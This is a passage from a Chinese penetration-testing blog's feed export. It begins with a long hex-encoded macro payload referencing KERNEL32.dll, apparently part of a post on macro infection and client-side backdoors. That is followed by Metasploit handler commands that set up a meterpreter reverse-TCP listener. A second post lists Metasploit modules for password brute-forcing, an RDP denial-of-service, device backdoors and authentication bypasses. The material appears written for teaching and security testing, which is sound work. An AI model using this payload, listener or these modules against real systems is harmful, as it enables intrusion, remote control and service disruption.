H90&amp;H32&amp;H82&amp;H00&amp;H83&amp;H09&amp;H6D&amp;H50&amp;HAC&amp;HF3&amp;H1C&amp;H43&amp;H73&amp;HD2&amp;H73&amp;HA2&amp;H52&amp;H6D&amp;H64&amp;HB4&amp;H00&amp;HF2&amp;H2E&amp;H59&amp;H3D&amp;HA9&amp;H46&amp;H4E&amp;H59&amp;H2C&amp;H9A&amp;H03&amp;H2E&amp;H11&amp;H57&amp;H4F&amp;H7F&amp;HE4&amp;H79&amp;HF1&amp;H57&amp;H12&amp;HC9&amp;H37&amp;H85&amp;H02&amp;H47&amp;H8F&amp;H49&amp;H19&amp;H7A&amp;H75&amp;H33&amp;H65&amp;H4D&amp;H21&amp;HF2&amp;H26&amp;H6A&amp;H3A&amp;HCA&amp;HBA&amp;H8D&amp;H7D&amp;HFA&amp;H55&amp;H20&amp;H66&amp;H7B&amp;HF5&amp;H4F&amp;H75&amp;H3A&amp;HF4&amp;H8A&amp;H40&amp;H7D&amp;H3B&amp;HE0&amp;H6A&amp;H06&amp;HF8&amp;HA3&amp;HAD&amp;H1A&amp;H57&amp;H05&amp;H77&amp;H06&amp;HF3&amp;H3A&amp;HCE&amp;HB9&amp;H44&amp;H8C&amp;H22&amp;HE6&amp;H62&amp;H93&amp;H60&amp;HAC&amp;H09&amp;HE7&amp;H11&amp;H7B&amp;H7E&amp;H41&amp;H28&amp;H2B&amp;H49&amp;H21&amp;H8A&amp;HB3&amp;H03&amp;HAA&amp;H7C&amp;H9B&amp;H12&amp;H35&amp;HDE&amp;H29&amp;HCA&amp;H2F&amp;H96&amp;H56&amp;H08&amp;HAA&amp;HE1&amp;H20&amp;H5C&amp;H18&amp;H05&amp;H13&amp;H26&amp;H43&amp;H7D&amp;HF2&amp;H89&amp;H15&amp;HE9&amp;H33&amp;H05&amp;H0A&amp;H54&amp;HBD&amp;H2E&amp;HA5&amp;H3F&amp;H06&amp;HD1&amp;HD3&amp;H12&amp;H95&amp;HF1&amp;H37&amp;H43&amp;HD1&amp;HF1&amp;H91&amp;H03&amp;H94&amp;H0D&amp;HF7&amp;HFA&amp;HDD&amp;H63&amp;H16&amp;H85&amp;HDB&amp;H8F&amp;HF0&amp;HD0&amp;H74&amp;HE0&amp;HA6&amp;HD4&amp;HF2&amp;H4A&amp;H60&amp;H55&amp;HD2&amp;H2F&amp;H4E&amp;H5E&amp;H8B&amp;H61&amp;H13&amp;HE8&amp;H84&amp;H28&amp;H70&amp;H6C&amp;HB9&amp;H1B&amp;H09&amp;H15&amp;H31&amp;HD8&amp;H4D&amp;H5A&amp;H7D&amp;H79&amp;H2A&amp;H01&amp;H47&amp;HD4&amp;HE4&amp;HB3&amp;HF2&amp;HED&amp;HDA&amp;H3B&amp;HFD&amp;HCD&amp;H74&amp;HEB&amp;H48&amp;H21&amp;H32&amp;HF7&amp;H67&amp;H48&amp;HAF&amp;H54&amp;H39&amp;HA6&amp;H8C&amp;H85&amp;H1B&amp;HA3&amp;H06&amp;H68&amp;H78&amp;HAD&amp;H20&amp;H1D&amp;H1C&amp;HD1&amp;H1D&amp;H2B&amp;H1B&amp;H6E&amp;HA2&amp;H26&amp;HBA&amp;H13&amp;H33&amp;H42&amp;HC1&amp;H2B&amp;H08&amp;H89&amp;H6A&amp;HD3&amp;H18&amp;H41&amp;H85&amp;H72&amp;HD0&amp;HDC&amp;H7C&amp;H87&amp;H31&amp;H2A&amp;H1F&amp;H4E&amp;H3C&amp;HCE&amp;H64&amp;HD1&amp;H14&amp;HF3&amp;H17&amp;HF9&amp;H09&amp;H79&amp;H26&amp;HB6&amp;H8F&amp;H23&amp;HAA&amp;H47&amp;H39&amp;HEA&amp;H69&amp;H1D&amp;H18&amp;HCE&amp;H00&amp;H97&amp;HF7&amp;H76&amp;H55&amp;H2A&amp;H58&amp;H4A&amp;H44&amp;HFC&amp;H81&amp;H79&amp;HA8&amp;HC4&amp;H82&amp;H75&amp;HCF&amp;H3B&amp;H59&amp;H67&amp;H9C&amp;HA1&amp;HD7&amp;HA7&amp;H48&amp;HEC&amp;H50&amp;HB5&amp;H6A&amp;HB4&amp;H6D&amp;HC8&amp;H54&amp;H27&amp;HD6&amp;H22&amp;HEB&amp;H34&amp;HA5&amp;H78&amp;HD9&amp;H4E&amp;HF1&amp;HD7&amp;H80&amp;HF4&amp;H72&amp;HB0&amp;HE8&amp;HD5&amp;H5B&amp;HA1&amp;H39&amp;HD7&amp;H79&amp;HB7&amp;H84&amp;H4A&amp;H9A&amp;H5B&amp;HEF&amp;HAE&amp;H32&amp;H75&amp;H05&amp;H8E&amp;H63&amp;H48&amp;H2D&amp;H9C&amp;HD1&amp;H62&amp;H85&amp;H50&amp;H0A&amp;H57&amp;H52&amp;H27&amp;H3A&amp;H0A&amp;H69&amp;H56&amp;HDC&amp;H0B&amp;HD7&amp;H0C&amp;H7C&amp;HE8&amp;HEE&amp;H3E&amp;H09&amp;H1F&amp;H14&amp;HD8&amp;HCE&amp;H2F&amp;H7D&amp;H0C&amp;H46&amp;H43&amp;H89&amp;H03&amp;H82&amp;HE4&amp;HA4&amp;HA0&amp;H53&amp;H02&amp;H0C&amp;HA5&amp;HEB&amp;H04&amp;H1E&amp;HFC&amp;H2F&amp;HE9&amp;H97&amp;HC2&amp;H29&amp;H37&amp;HF6&amp;H9B&amp;HBF&amp;H0A&amp;H44&amp;HBA&amp;HA2&amp;H31&amp;HEB&amp;H78&amp;H70&amp;H1A&amp;H8A&amp;HCD&amp;H20&amp;H90&amp;HE4&amp;HBF&amp;H08&amp;H1F&amp;H1C&amp;H2A&amp;H81&amp;H85&amp;H0C&amp;HB2&amp;HD4&amp;HA1&amp;HFC&amp;H26&amp;HB3&amp;HCB&amp;H7B&amp;HAA&amp;H89&amp;H05&amp;HD0&amp;H43&amp;HCB&amp;H13&amp;H5E&amp;H8F&amp;HA3&amp;H1A&amp;HD9&amp;HDE&amp;H9D&amp;H4B&amp;HA3&amp;H8D&amp;H6D&amp;HF3&amp;HAA&amp;HC2&amp;HAC&amp;HCE&amp;H40&amp;H6F&amp;H71&amp;H20&amp;HC8&amp;H18&amp;H15&amp;H07&amp;H94&amp;H28&amp;HD9&amp;HDD&amp;H8E&amp;HCF&amp;H86&amp;HB2&amp;HA1&amp;H34&amp;HEC&amp;H2C&amp;H0A&amp;HE5&amp;HF5&amp;H6A&amp;HC3&amp;HB9&amp;H35&amp;H14&amp;HE9&amp;H59&amp;HDA&amp;H36&amp;HCD&amp;H16&amp;H5C&amp;HE2&amp;HCB&amp;HB4&amp;H44&amp;H0B&amp;H81&amp;HA9&amp;H78&amp;H4E&amp;HF6&amp;HE3&amp;H83&amp;HD8&amp;HF2&amp;H06&amp;H6C&amp;HDE&amp;H3B&amp;H43&amp;HD4&amp;HF8&amp;H22&amp;H80&amp;H91&amp;H20&amp;H2A&amp;H86&amp;HE5&amp;H98&amp;HF5&amp;HCA&amp;HB6&amp;H04&amp;H10&amp;H2B&amp;HED&amp;H6E&amp;HEA&amp;H78&amp;HA4&amp;H64&amp;HF7&amp;H58&amp;HC5&amp;H3C&amp;H02&amp;H4E&amp;H53&amp;H85&amp;H35&amp;HBC&amp;H66&amp;HC7&amp;H39&amp;HC5&amp;HEA&amp;HD9&amp;H09&amp;H3D&amp;HFF&amp;H4B&amp;H69&amp;HA4&amp;H16&amp;H15&amp;H70&amp;H3F&amp;H62&amp;H80&amp;H28&amp;HED&amp;HC6&amp;H15&amp;H37&amp;HD0&amp;H6B&amp;HBE&amp;H0D&amp;H3D&amp;H92&amp;H45&amp;HB3&amp;H0A&amp;H88&amp;HA0&amp;HFA&amp;H7A&amp;HF3&amp;H38&amp;H4F&amp;H83&amp;H1C&amp;H7A&amp;HA6&amp;HE5&amp;H0B&amp;H18&amp;H33&amp;H0F&amp;H69&amp;H0B&amp;HDF&amp;H43&amp;H4B&amp;H49&amp;H78&amp;H16&amp;HB8&amp;HE8&amp;HE9&amp;H8F&amp;HDB&amp;H85&amp;H7D&amp;HB0&amp;HFE&amp;H13&amp;H13&amp;H87&amp;H84&amp;H59&amp;H82&amp;H70&amp;HEC&amp;H7C&amp;H5F&amp;H73&amp;HCA&amp;H82&amp;HFE&amp;H44&amp;H47&amp;HA1&amp;H05&amp;H1F&amp;H4C&amp;H2B&amp;HBA&amp;H37&amp;H18&amp;H5E&amp;H03&amp;H11&amp;HAF&amp;H9D&amp;HC8&amp;H0E&amp;H52&amp;H1D&amp;H28&amp;H50&amp;HAC&amp;HD9&amp;H96&amp;HB5&amp;H84&amp;H9B&amp;H9F&amp;H61&amp;H99&amp;HEE&amp;H62&amp;H23&amp;H6B&amp;HE4&amp;H69&amp;H25&amp;H79&amp;H11&amp;HC9&amp;HBC&amp;H9C&amp;HD8&amp;HE1&amp;H86&amp;HCC&amp;HAB&amp;HDC&amp;H25&amp;H26&amp;H40&amp;HF5&amp;H14&amp;H5A&amp;H70&amp;H85&amp;H81&amp;H73&amp;HBD&amp;H9F&amp;H97&amp;H94&amp;HE0&amp;H05&amp;H14&amp;H97&amp;H90&amp;H85&amp;H24&amp;H0A&amp;H24&amp;H45&amp;H0D&amp;H72&amp;H08&amp;H3F&amp;H8C&amp;H33&amp;H6B&amp;H9B&amp;H27&amp;H30&amp;HA8&amp;H11&amp;H0C&amp;HF2&amp;H4E&amp;H20&amp;H9A&amp;H74&amp;H68&amp;H68&amp;H57&amp;HA0&amp;HBA&amp;HE5&amp;HE7&amp;H7C&amp;HDC&amp;H0D&amp;HDB&amp;HC7&amp;H1B&amp;H09&amp;H48&amp;HB5&amp;H53&amp;H76&amp;HD0&amp;H4E&amp;H80&amp;HAE&amp;HAC&amp;HA7&amp;H28&amp;H03&amp;HC1&amp;H94&amp;H96&amp;HBF&amp;HD1&amp;HEA&amp;HC1&amp;H56&amp;HE9&amp;HC0&amp;H79&amp;H95&amp;H52&amp;HE6&amp;H0F&amp;H28&amp;H3C&amp;H25&amp;H34&amp;H56&amp;H15&amp;H8F&amp;HAE&amp;H8F&amp;H68&amp;H03&amp;H81&amp;H4C&amp;HE3&amp;H61&amp;H96&amp;H8C&amp;H0B&amp;H75&amp;HBD&amp;HC0&amp;H7E&amp;HF7&amp;H8B&amp;H13&amp;H49&amp;H5D&amp;H0B&amp;H47&amp;H98&amp;HF4&amp;H6C&amp;H1F&amp;HCA&amp;H1A&amp;H0A&amp;H83&amp;H9B&amp;H48&amp;H2B&amp;H45&amp;H98&amp;H98&amp;H28&amp;H73&amp;H0A&amp;H0E&amp;HF0&amp;H6A&amp;HCF&amp;H2F&amp;H7B&amp;H22&amp;HFC&amp;H58&amp;H24&amp;H94&amp;H38&amp;H0C&amp;HC3&amp;H6E&amp;HD9&amp;HD8&amp;HB8&amp;H05&amp;H24&amp;H64&amp;H2C&amp;H35&amp;HE8&amp;H6A&amp;HD8&amp;HAE&amp;H35&amp;H8B&amp;H48&amp;HAA&amp;H12&amp;HF5&amp;H07&amp;H54&amp;H2D&amp;H65&amp;H4B&amp;H71&amp;H72&amp;H45&amp;H09&amp;H93&amp;HD1&amp;H4B&amp;H14&amp;H7B&amp;H9B&amp;H87&amp;HE1&amp;H28&amp;HDD&amp;H8C&amp;H2C&amp;H72&amp;HA1&amp;HA7&amp;H64&amp;H2D&amp;H72&amp;HE6&amp;H5A&amp;H37&amp;H79&amp;HBB&amp;H06&amp;H78&amp;H9B&amp;HC3&amp;H74&amp;H73&amp;H03&amp;HDB&amp;HDA&amp;H4C&amp;H32&amp;HED&amp;HAC&amp;H36&amp;HF3&amp;H64&amp;HA0&amp;H76&amp;HF2&amp;H78&amp;H10&amp;HB7&amp;H5C&amp;H44&amp;HA8&amp;H6B&amp;H1C&amp;HD7&amp;H33&amp;HB7&amp;HE6&amp;HBC&amp;HA4&amp;H0A&amp;H17&amp;H8E&amp;HB6&amp;H95&amp;H96&amp;H14&amp;H77&amp;H97&amp;HF4&amp;HD4&amp;H49&amp;H6B&amp;HD7&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00</span><br><span class="line">&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H2C&amp;H30&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H54&amp;H30&amp;H00&amp;H00&amp;H38&amp;H30&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H40&amp;H30&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H40&amp;H30&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H9C&amp;H00&amp;H45&amp;H78&amp;H69&amp;H74&amp;H50&amp;H72&amp;H6F&amp;H63&amp;H65&amp;H73&amp;H73&amp;H00&amp;H00&amp;H00&amp;H00&amp;H30&amp;H00&amp;H00&amp;H4B&amp;H45&amp;H52&amp;H4E&amp;H45&amp;H4C&amp;H33&amp;H32&amp;H2E&amp;H64&amp;H6C&amp;H6C&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H7C&amp;HD1&amp;HFC&amp;H2D&amp;H5B&amp;HDE&amp;H92&amp;HE6&amp;HF4&amp;H19&amp;HCF&amp;HBD&amp;HB3&amp;H75&amp;H0F&amp;HC4&amp;HA8&amp;HBF&amp;H60&amp;H34&amp;H1C&amp;H96&amp;H14&amp;H72&amp;HE3&amp;HFE&amp;H61&amp;HED&amp;H46&amp;H58&amp;HD0&amp;H1C&amp;H3B&amp;H06&amp;HB2&amp;HEF&amp;H20&amp;H0D&amp;HAC&amp;H12&amp;HA7&amp;HFB&amp;HD9&amp;H92&amp;H67&amp;H86&amp;HB7&amp;H5B&amp;HB2&amp;H12&amp;HD1&amp;H03&amp;HDB&amp;HC5&amp;H54&amp;HA6&amp;H87&amp;H8A&amp;H8D&amp;H29&amp;H01</span><br></pre></td></tr></table></figure></li></ul></li><li><p><strong>MsF启动侦听</strong></p><ul><li>use exploit/multi/handler</li><li>set payload windows/meterpreter/reverse_tcp</li><li>set lhost 192.168.190.175</li><li>exploit -j</li></ul></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;strong&gt;在无法突破网络边界的情况下转而攻击客户端&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;社会工程学攻击&lt;/li&gt;
&lt;li&gt;进而渗透线上业务网络&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;含有漏洞利用代码的WEB站点&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li
      
    
    </summary>
    
    
      <category term="渗透测试" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
      <category term="漏洞利用" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
    
      <category term="MSF" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/MSF/"/>
    
    
      <category term="MSF" scheme="http://c.cat.plus/tags/MSF/"/>
    
      <category term="deb后门" scheme="http://c.cat.plus/tags/deb%E5%90%8E%E9%97%A8/"/>
    
      <category term="flash漏洞" scheme="http://c.cat.plus/tags/flash%E6%BC%8F%E6%B4%9E/"/>
    
      <category term="浏览器漏洞" scheme="http://c.cat.plus/tags/%E6%B5%8F%E8%A7%88%E5%99%A8%E6%BC%8F%E6%B4%9E/"/>
    
      <category term="android后门" scheme="http://c.cat.plus/tags/android%E5%90%8E%E9%97%A8/"/>
    
      <category term="宏感染" scheme="http://c.cat.plus/tags/%E5%AE%8F%E6%84%9F%E6%9F%93/"/>
    
  </entry>
  
  <entry>
    <title>MsF漏洞扫描及加载常用扫描程序</title>
    <link href="http://c.cat.plus/2016/03/09/Exploits/MsF/MsF%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F%E5%8F%8A%E5%8A%A0%E8%BD%BD%E5%B8%B8%E7%94%A8%E6%89%AB%E6%8F%8F%E7%A8%8B%E5%BA%8F/"/>
    <id>http://c.cat.plus/2016/03/09/Exploits/MsF/MsF%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F%E5%8F%8A%E5%8A%A0%E8%BD%BD%E5%B8%B8%E7%94%A8%E6%89%AB%E6%8F%8F%E7%A8%8B%E5%BA%8F/</id>
    <published>2016-03-08T17:21:23.000Z</published>
    <updated>2020-07-02T11:57:40.991Z</updated>
    
    <content type="html"><![CDATA[<h4 id="MsF弱点扫描"><a href="#MsF弱点扫描" class="headerlink" title="MsF弱点扫描"></a><strong>MsF弱点扫描</strong></h4><ul><li>根据信息收集结果搜索漏洞利用模块</li><li>结合外部漏洞扫描系统对大IP地址段进行批量扫描</li><li>误判率,漏判率</li></ul><p><strong>VNC 密码破解</strong></p><pre><code>use auxiliary/scanner/vnc/vnc_login</code></pre><p><strong>VNC 无密码访问</strong></p><pre><code>use auxiliary/scanner/vnc/vnc_none_authsupported : None, free access!</code></pre><p><strong>RDP远程桌面漏洞</strong></p><pre><code>search ms12_020use auxiliary/scanner/rdp/ms12_020_check    #检查不会造成DoS攻击use auxiliary/dos/windows/rdp/ms12_020_maxchannelids    #DoS攻击模块</code></pre><p><strong>设备后门</strong></p><pre><code>use auxiliary/scanner/ssh/juniper_backdoor        #juniper防火墙后门use auxiliary/scanner/ssh/fortinet_backdoor</code></pre><p><strong>VMWare ESXi 密码爆破</strong></p><pre><code>use auxiliary/scanner/vmware/vmauthd_login        #爆破模块use auxiliary/scanner/vmware/vmware_enum_vms</code></pre><p><strong>利用Web API 远程开启虚拟机</strong></p><pre><code>use auxiliary/admin/vmware/poweron_vm        #管理模块</code></pre><h4 id="HTTP-弱点扫描"><a href="#HTTP-弱点扫描" class="headerlink" title="HTTP 弱点扫描"></a>HTTP 弱点扫描</h4><p><strong>扫描过期证书</strong></p><pre><code>use auxiliary/scanner/http/cert</code></pre><p><strong>扫描目录及文件</strong></p><pre><code>use auxiliary/scanner/http/dir_listing        #目录列表use auxiliary/scanner/http/files_dir        #扫文件</code></pre><p><strong>WebDAV Unicode 编码身份验证绕过</strong></p><pre><code>use auxiliary/scanner/http/dir_webdav_unicode_bypass</code></pre><p><strong>Tomcat 管理登录</strong></p><pre><code>use auxiliary/scanner/http/tomcat_mgr_login</code></pre><p><strong>基于HTTP方法的身份验证绕过</strong></p><pre><code>use auxiliary/scanner/http/verb_auth_bypass</code></pre><p><strong>Wordpress密码破解</strong></p><pre><code>use auxiliary/scanner/http/wordpress_login_enum</code></pre><p><strong>WMAP WEB应用扫描器</strong></p><ul><li>根据SQLMAP的工作方式开发</li></ul><pre><code>load wmap    #msf 加载wmap插件wmap_sites -a http://1.1.1.1wmap_targets -t http://1.1.1.1/mutillidae/index.phpwmap_run -twmap_run -ewmap_vulns -lvulns</code></pre><p><strong>Openvas</strong></p><pre><code>load openvas        #命令行模式,需要配置,使用繁琐db_import openvas.nbe     #导入nbe格式扫描日志</code></pre><p><strong>Nessus</strong></p><pre><code>load nessusnessus_helpnessus_connect admin:toor@1.1.1.1nessus_policy_listnessus_scan_newnessus_report_list</code></pre><p><strong>Nexpose</strong></p><pre><code>导入xml格式日志文件</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;MsF弱点扫描&quot;&gt;&lt;a href=&quot;#MsF弱点扫描&quot; class=&quot;headerlink&quot; title=&quot;MsF弱点扫描&quot;&gt;&lt;/a&gt;&lt;strong&gt;MsF弱点扫描&lt;/strong&gt;&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;根据信息收集结果搜索漏洞利用模块&lt;/li&gt;
&lt;li&gt;结
      
    
    </summary>
    
    
      <category term="渗透测试" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
      <category term="漏洞利用" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
    
